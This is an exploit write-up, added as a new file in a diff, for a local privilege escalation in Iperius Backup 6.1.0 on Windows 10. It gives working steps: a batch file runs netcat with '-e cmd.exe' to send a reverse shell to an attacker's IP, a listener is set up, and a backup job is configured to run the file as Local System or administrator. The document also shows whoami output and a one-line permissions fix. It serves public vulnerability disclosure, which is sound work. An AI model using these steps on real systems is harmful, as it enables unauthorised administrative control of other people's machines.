@@ -1,0 +1,62 @@
+Exploit Author: bzyo
+Twitter: @bzyo_
+Exploit Title: Iperius Backup 6.1.0 - Privilege Escalation
+Date: 04-24-19
+Vulnerable Software: Iperius Backup 6.1.0
+Vendor Homepage: https://www.iperiusbackup.com/
+Version: 6.1.0
+Software Link: https://www.iperiusbackup.com/download.aspx
+Tested on: Windows 10 x64
+
+Details:
+Iperius Backup Service must run as Local System or a system administrator. By default the application allows for low privilege users to create/run backup jobs and edit existing jobs due to file permissions.  An option when creating a backup job is to run a program before or after the backup job.  The backup job is run as the user of the running service, as such the program requested to run before or after a backup job is run as that same user.  A low privilege user could abuse this and escalate their privileges to either local system or an administrator account.
+
+Vendor Post - Installation as Windows service: what it is and why it’s important
+https://www.iperiusbackup.net/en/installation-windows-service-iperius-backup/
+
+Prerequisites:
+To successfully exploit this vulnerability, an attacker must already have local access 
+to a system running Iperius Backup and Iperius Backup Service using a
+low privileged user account
+
+Exploit:
+1. Login as low privilege user where Iperius Backup and Iperius Backup Service are installed
+
+2. Download netcat  from attacking machine
+	 c:\users\low\downloads\nc.exe
+	 
+3. Create batch file calling netcat and sending command prompt to attacking machine
+	c:\users\low\desktop\evil.bat
+		@echo off
+		c:\users\low\downloads\nc.exe 192.168.0.163 443 -e cmd.exe
+
+4. Setup listener on attacking machine
+	nc -nlvvp 443
+
+5. Open Iperius Backup and create new backup job
+	- set any folder to backup (c:\temp)
+	- set to any destination (c:\users\low\desktop)
+	- set program to run before backup job (c:\users\low\desktop\evil.bat)
+
+6. Right-click on newly created job and select "Run backup service as"
+	- will either be local system or administrator account
+
+7. Command prompt on attacking machine will appear
+	C:\Program Files (x86)\Iperius Backup>whoami
+	whoami
+	<computer name>\<administrator>
+
+	Or
+	
+	C:\Program Files (x86)\Iperius Backup>whoami
+	whoami
+	nt authority\system
+
+Risk:
+The vulnerability allows local attackers to escalate privileges and execute arbitrary code as Local System or Administrator
+
+Notes:
+Able to open elevated command prompt locally if service is running as local system, but not when using an administrator account.  Also able to backup entire administrator user profile as low privilege account.
+
+Fix:
+Remove Everyone permission to folder c:\ProgramData\IperiusBackup
